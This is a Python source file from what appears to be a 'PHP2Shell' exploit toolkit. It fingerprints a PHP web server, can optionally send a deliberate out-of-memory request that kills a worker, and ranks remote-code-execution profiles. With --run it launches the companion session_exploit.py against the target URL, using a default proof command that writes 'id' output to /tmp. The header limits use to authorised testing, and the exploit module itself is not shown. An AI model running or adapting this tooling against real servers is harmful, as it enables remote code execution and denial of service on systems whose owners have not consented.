#!/usr/bin/env python3
"""Fingerprint a PHP target and select a known PHP2Shell build profile.

Passive mode (default) reads the target response, Server/X-Powered-By headers,
cookies and common version hints.  Active probes are opt-in:

  --active       small session.upload_progress probe; no OOM
  --oom-probe    one controlled OOM to read memory_limit (destructive to a
                 worker and only appropriate on an authorized lab)

Only run --run and the exploit against systems you own or have explicit
written permission to test.  One target per invocation; this is not a scanner.
"""
from __future__ import annotations

import argparse
import http.client
import json
import re
import secrets
import ssl
import subprocess
import sys
import time
import urllib.parse
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

from profile_db import (
    list_profiles,
    load_profile,
    match_profiles,
    normalize_arch,
    profile_command,
    profile_requirements_ok,
    recommended_huge_mb,
)
from session_exploit import build_multipart


# ---------------------------------------------------------------------------
# HTTP


@dataclass
class ProbeResponse:
    url: str
    status: int
    reason: str
    headers: list[tuple[str, str]]
    body: bytes
    redirects: list[str] = field(default_factory=list)

    def values(self, name: str) -> list[str]:
        key = name.lower()
        return [v for k, v in self.headers if k.lower() == key]

    def header(self, name: str, default: str = "") -> str:
        vals = self.values(name)
        return vals[-1] if vals else default

    @property
    def set_cookies(self) -> list[str]:
        return self.values("set-cookie")

    @property
    def text(self) -> str:
        return self.body.decode("latin1", "replace")


class HttpClient:
    def __init__(self, url: str, *, timeout: float = 10.0,
                 insecure: bool = False, max_body: int = 1 << 20):
        self.url = url
        self.timeout = timeout
        self.insecure = insecure
        self.max_body = max_body

    def _connection(self, parts: urllib.parse.SplitResult):
        context = None
        if parts.scheme == "https":
            context = ssl.create_default_context()
            if self.insecure:
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
        port = parts.port or (443 if parts.scheme == "https" else 80)
        if parts.scheme == "https":
            return http.client.HTTPSConnection(parts.hostname, port,
                                               timeout=self.timeout,
                                               context=context)
        return http.client.HTTPConnection(parts.hostname, port,
                                          timeout=self.timeout)

    def request(self, method: str, path: str | None = None,
                body: bytes | None = None,
                headers: dict[str, str] | None = None,
                *, follow: bool = True,
                max_redirects: int = 4) -> ProbeResponse:
        current = path or self.url
        method = method.upper()
        redirects: list[str] = []
        for _ in range(max_redirects + 1):
            parts = urllib.parse.urlsplit(current)
            if parts.scheme not in ("http", "https") or not parts.hostname:
                raise ValueError(f"unsupported URL {current!r}")
            target = parts.path or "/"
            if parts.query:
                target += "?" + parts.query
            hdrs = {
                "User-Agent": "php2shell-fingerprint/0.1",
                "Accept": "*/*",
                "Connection": "close",
            }
            hdrs.update(headers or {})
            conn = self._connection(parts)
            try:
                conn.request(method, target, body=body, headers=hdrs)
                resp = conn.getresponse()
                data = resp.read(self.max_body)
                result = ProbeResponse(
                    current, resp.status, resp.reason,
                    list(resp.getheaders()), data, redirects)
            finally:
                conn.close()
            location = result.header("location")
            if (follow and method in ("GET", "HEAD") and
                    result.status in (301, 302, 303, 307, 308) and location):
                current = urllib.parse.urljoin(current, location)
                redirects.append(current)
                continue
            return result
        raise RuntimeError("too many redirects")


# ---------------------------------------------------------------------------
# Passive parsing


_VERSION_PATTERNS = (
    re.compile(r"PHP/(\d+\.\d+\.\d+)"),
    re.compile(r"PHP\s+Version\s*[:\s]\s*(\d+\.\d+\.\d+)", re.I),
    re.compile(r"PHP\s+(\d+\.\d+\.\d+)", re.I),
)
_OS_PATTERNS = (
    re.compile(r"\((Debian|Ubuntu|Alpine|CentOS|Red Hat|Amazon|openSUSE|FreeBSD|Win32|Win64|Unix)[^)]*\)", re.I),
    re.compile(r"\b(Debian|Ubuntu|Alpine|CentOS|Red Hat|Amazon|openSUSE|FreeBSD|Windows)\b", re.I),
)
_COOKIE_RE = re.compile(r"(?:^|;\s*)([^=;\s]+)=")


def _first_version(texts: list[str]) -> str | None:
    for text in texts:
        for pattern in _VERSION_PATTERNS:
            m = pattern.search(text)
            if m:
                return m.group(1)
    return None


def parse_passive(resp: ProbeResponse) -> dict[str, Any]:
    server = resp.header("server")
    xpb = resp.header("x-powered-by")
    via = resp.header("via")
    body = resp.text
    cookies: list[str] = []
    for value in resp.set_cookies:
        cookies.extend(_COOKIE_RE.findall(value))
    cookies = sorted(set(cookies))

    version = _first_version([xpb, server, body])
    php_seen = bool(version or "PHPSESSID" in cookies or
                    "PHPSESSID" in body or "PHP" in xpb.upper() or
                    ".php" in resp.url.lower())
    distro = "unknown"
    for pattern in _OS_PATTERNS:
        m = pattern.search(server)
        if m:
            distro = m.group(1).lower()
            break

    server_lower = server.lower()
    if "apache" in server_lower:
        sapi_hint = "apache"
        sapi_detail = "Apache; mod_php vs proxy_fcgi is not proven remotely"
    elif "nginx" in server_lower:
        sapi_hint = "nginx"
        sapi_detail = "nginx; likely PHP-FPM, not mod_php"
    elif "litespeed" in server_lower:
        sapi_hint = "litespeed"
        sapi_detail = "LiteSpeed; SAPI not mod_php"
    elif "microsoft-iis" in server_lower:
        sapi_hint = "iis"
        sapi_detail = "IIS; FastCGI/other, not mod_php"
    else:
        sapi_hint = "unknown"
        sapi_detail = "server product not recognised"

    title = ""
    m = re.search(r"<title[^>]*>(.*?)</title>", body, re.I | re.S)
    if m:
        title = re.sub(r"\s+", " ", m.group(1)).strip()[:200]
    generator = ""
    m = re.search(r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']([^"\']+)',
                  body, re.I)
    if m:
        generator = m.group(1)[:120]

    return {
        "requested_url": resp.url,
        "status": resp.status,
        "server": server,
        "server_software": server.split()[0] if server else "",
        "x_powered_by": xpb,
        "via": via,
        "php_seen": php_seen,
        "php_version": version,
        "php_exposed": bool(version),
        "distro": distro,
        "sapi_hint": sapi_hint,
        "sapi_detail": sapi_detail,
        "cookies": cookies,
        "session_cookie": "PHPSESSID" in cookies or "PHPSESSID" in body,
        "title": title,
        "generator": generator,
        "redirects": resp.redirects,
        "headers": {
            "server": server,
            "x-powered-by": xpb,
            "via": via,
            "content-type": resp.header("content-type"),
            "set-cookie": resp.set_cookies[:8],
        },
    }


# ---------------------------------------------------------------------------
# Active probes


def _probe_parts(progress: bool = True) -> tuple[list[dict], bytes]:
    boundary = ("----p2s" + secrets.token_hex(8)).encode()
    sid = secrets.token_hex(13)
    parts: list[dict] = [
        {"name": "PHPSESSID", "data": sid.encode()},
    ]
    if progress:
        parts.append({
            "name": "PHP_SESSION_UPLOAD_PROGRESS",
            "data": ("p2s" + secrets.token_hex(4)).encode(),
        })
    parts.append({"name": "f", "filename": "a.txt", "data": b"A" * 64})
    return parts, boundary


def probe_session_upload(client: HttpClient, path: str | None) -> dict[str, Any]:
    """Small upload-progress probe; no OOM and no large field."""
    out: dict[str, Any] = {}
    last_error = ""
    for label, use_progress in (("probe", True), ("control", False)):
        parts, boundary = _probe_parts(use_progress)
        body = build_multipart(parts, boundary)
        headers = {
            "Content-Type": f"multipart/form-data; boundary={boundary.decode()}",
            "Content-Length": str(len(body)),
        }
        try:
            resp = client.request("POST", path, body, headers, follow=False)
        except (OSError, http.client.HTTPException, ValueError) as exc:
            out[label] = {"error": repr(exc)}
            last_error = repr(exc)
            continue
        set_cookie = [v for v in resp.set_cookies
                      if v.lower().startswith("phpsessid=")]
        out[label] = {
            "status": resp.status,
            "set_cookie": bool(set_cookie),
            "set_cookie_value": set_cookie[0][:160] if set_cookie else "",
        }
    probe = out.get("probe") or {}
    control = out.get("control") or {}
    if probe.get("set_cookie") and not control.get("set_cookie"):
        enabled: bool | None = True
    elif probe.get("set_cookie") and control.get("set_cookie"):
        enabled = None
    elif "error" in probe and "error" in control:
        enabled = None
    elif probe.get("status") and not probe.get("set_cookie") and \
            control.get("status") and not control.get("set_cookie"):
        # The endpoint did not start a session for either request. This is
        # consistent with upload_progress disabled, but not proof.
        enabled = None
    else:
        enabled = False if probe.get("status") and not probe.get("set_cookie") else None
    out["enabled"] = enabled
    out["note"] = ("upload_progress probe requires a session-starting endpoint"
                   if enabled is None else "")
    if last_error:
        out["last_error"] = last_error
    return out


def probe_memory_limit(client: HttpClient, path: str | None,
                       probe_mb: int) -> dict[str, Any]:
    """One controlled OOM. Only for an authorized lab."""
    parts, boundary = _probe_parts(True)
    parts.append({"name": "big", "data": b"B" * (probe_mb << 20)})
    body = build_multipart(parts, boundary)
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary.decode()}",
        "Content-Length": str(len(body)),
    }
    try:
        resp = client.request("POST", path, body, headers, follow=False)
    except (OSError, http.client.HTTPException, ValueError) as exc:
        return {"error": repr(exc), "probe_mb": probe_mb}
    text = resp.text
    m = re.search(r"Allowed memory size of (\d+) bytes exhausted", text)
    limit = int(m.group(1)) if m else None
    if limit is None:
        m = re.search(r"memory_limit[^0-9]{0,40}(\d+)", text, re.I)
        if m:
            limit = int(m.group(1))
    return {
        "probe_mb": probe_mb,
        "status": resp.status,
        "limit_bytes": limit,
        "evidence": text[:500],
    }


# ---------------------------------------------------------------------------
# Output / selection


def _candidate_rows(matches: list[dict[str, Any]]) -> list[str]:
    rows = []
    for m in matches:
        flags = []
        if m.get("rce"):
            flags.append("RCE")
        if m.get("verified"):
            flags.append("verified")
        if not m.get("compatible"):
            flags.append("incompatible")
        command = ""
        if m.get("compatible") and m.get("rce") and profile_requirements_ok(m)[0]:
            command = " ".join(profile_command(
                m, "<url>", "<cmd>", "<proof>", python="python3",
                huge_mb=m.get("recommended_huge_mb")))
        rows.append(
            f"{m['name']:<40} score={m['score']:<4} "
            f"{' '.join(flags):<24} {m.get('status', '')}")
        if command:
            rows.append(f"    {command}")
        for warning in m.get("warnings") or []:
            rows.append(f"    ! {warning}")
    return rows


def _choose_profile(args, matches: list[dict[str, Any]]) -> dict[str, Any]:
    if args.profile:
        chosen = load_profile(args.profile)
        ok, problems = profile_requirements_ok(chosen)
        if not ok:
            raise SystemExit("profile is not runnable: " + "; ".join(problems))
        return chosen
    runnable = [m for m in matches
                if m.get("compatible") and m.get("rce") and
                profile_requirements_ok(m)[0]]
    if not runnable:
        raise SystemExit("no compatible verified RCE profile; run with --active "
                         "and/or supply --arch, or calibrate this build")
    top = runnable[0]
    same_version = [m for m in runnable
                    if m.get("php_version") == top.get("php_version")]
    arches = {m.get("arch") for m in same_version}
    if not args.arch and len(arches) > 1:
        raise SystemExit(
            f"{top['php_version']} has multiple architecture profiles "
            f"({', '.join(sorted(arches))}); pass --arch x86_64 or --arch aarch64")
    return top


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Fingerprint a PHP target and select a PHP2Shell build profile",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    ap.add_argument("-u", "--url", help="target URL (one host only)")
    ap.add_argument("--arch", choices=("auto", "x86_64", "amd64", "aarch64", "arm64"),
                    default="auto")
    ap.add_argument("--php-version", default=None,
                    help="override the detected PHP version")
    ap.add_argument("--distro", default=None, help="override detected distro")
    ap.add_argument("--sapi-hint", default=None,
                    choices=("auto", "apache", "nginx", "litespeed", "iis"),
                    help="override SAPI hint")
    ap.add_argument("--workers", type=int, default=None,
                    help="known prefork worker count")
    ap.add_argument("--memory-limit-mb", type=int, default=None,
                    help="known memory_limit; avoids the OOM probe")
    ap.add_argument("--active", action="store_true",
                    help="run the small non-OOM upload-progress probe")
    ap.add_argument("--oom-probe", action="store_true",
                    help="send one controlled OOM to discover memory_limit")
    ap.add_argument("--probe-mb", type=int, default=12,
                    help="big field size for --oom-probe")
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--insecure", action="store_true",
                    help="do not verify TLS certificates (lab only)")
    ap.add_argument("--json", action="store_true",
                    help="emit fingerprint and ranked matches as JSON")
    ap.add_argument("--profile", default=None,
                    help="force a profile name or JSON path")
    ap.add_argument("--list-profiles", action="store_true")
    ap.add_argument("--limit", type=int, default=8)
    ap.add_argument("--run", action="store_true",
                    help="run session_exploit.py with the selected profile")
    ap.add_argument("-c", "--cmd", default="id>/tmp/p2s-proof")
    ap.add_argument("--proof-file", default="/tmp/p2s-proof")
    args = ap.parse_args()

    if args.list_profiles:
        for p in list_profiles():
            flags = "RCE" if p.get("rce") else "-"
            print(f"{p['name']:<42} {p.get('php_version','?'):<9} "
                  f"{p.get('arch','?'):<8} {flags:<3} {p.get('status','')}")
        return 0
    if not args.url:
        ap.error("-u/--url is required unless --list-profiles is used")

    arch = None if args.arch == "auto" else normalize_arch(args.arch)
    client = HttpClient(args.url, timeout=args.timeout, insecure=args.insecure)
    try:
        resp = client.request("GET", follow=True)
    except (OSError, http.client.HTTPException, ValueError) as exc:
        print(f"request failed: {exc}", file=sys.stderr)
        return 2

    fp = parse_passive(resp)
    fp["arch"] = arch or "unknown"
    fp["workers"] = args.workers
    fp["memory_limit"] = (args.memory_limit_mb << 20
                          if args.memory_limit_mb else None)
    if args.php_version:
        fp["php_version"] = args.php_version
        fp["php_seen"] = True
    if args.distro:
        fp["distro"] = args.distro.lower()
    if args.sapi_hint and args.sapi_hint != "auto":
        fp["sapi_hint"] = args.sapi_hint

    if args.active or args.oom_probe:
        fp["session_probe"] = probe_session_upload(client, None)
        fp["session_upload_progress"] = fp["session_probe"].get("enabled")
    if args.oom_probe:
        fp["memory_probe"] = probe_memory_limit(client, None, args.probe_mb)
        if fp["memory_probe"].get("limit_bytes"):
            fp["memory_limit"] = fp["memory_probe"]["limit_bytes"]

    matches = match_profiles(fp, arch=arch, limit=args.limit)
    if args.profile:
        forced = load_profile(args.profile)
        # Keep the forced profile first for display, but preserve match metadata
        # when it is in the ranked set.
        forced["score"] = 999
        forced["compatible"] = profile_requirements_ok(forced)[0]
        forced["warnings"] = ["forced by --profile"]
        forced["recommended_huge_mb"] = recommended_huge_mb(
            forced, fp.get("memory_limit"))
        matches = [forced] + [m for m in matches
                              if m.get("name") != forced.get("name")]

    if args.json:
        print(json.dumps({
            "fingerprint": fp,
            "matches": matches,
        }, indent=2))
    else:
        print(f"[*] target {args.url} -> {resp.url} HTTP {resp.status}")
        if fp.get("php_version"):
            print(f"[*] PHP {fp['php_version']}"
                  + (" (X-Powered-By/body)" if fp.get("php_exposed") else ""))
        else:
            print("[!] PHP version not exposed; use --php-version or a phpinfo page")
        print(f"[*] server={fp.get('server')!r} distro={fp.get('distro')!r}")
        print(f"[*] SAPI hint={fp.get('sapi_hint')}: {fp.get('sapi_detail')}")
        print(f"[*] arch={fp.get('arch')} workers={fp.get('workers')}")
        if args.active or args.oom_probe:
            print(f"[*] upload_progress={fp.get('session_upload_progress')}")
        if fp.get("memory_limit"):
            print(f"[*] memory_limit={fp['memory_limit']} bytes")
        print("[*] profile matches:")
        for row in _candidate_rows(matches):
            print("  " + row)

    if args.run:
        try:
            chosen = _choose_profile(args, matches)
        except SystemExit as exc:
            print(f"[-] {exc}", file=sys.stderr)
            return 1
        huge = recommended_huge_mb(chosen, fp.get("memory_limit"))
        command = profile_command(chosen, args.url, args.cmd,
                                  args.proof_file, huge_mb=huge)
        print("[*] running:", " ".join(command), flush=True)
        try:
            Path(args.proof_file).unlink()
        except OSError:
            pass
        try:
            rc = subprocess.run(command).returncode
        except OSError as exc:
            print(f"[-] could not launch exploit: {exc}", file=sys.stderr)
            return 1
        if Path(args.proof_file).is_file():
            print("[+] proof file:", args.proof_file)
            print(Path(args.proof_file).read_text(errors="replace").strip())
            return 0
        print(f"[-] exploit exited {rc}; no proof file at {args.proof_file}",
              file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        raise SystemExit(130)
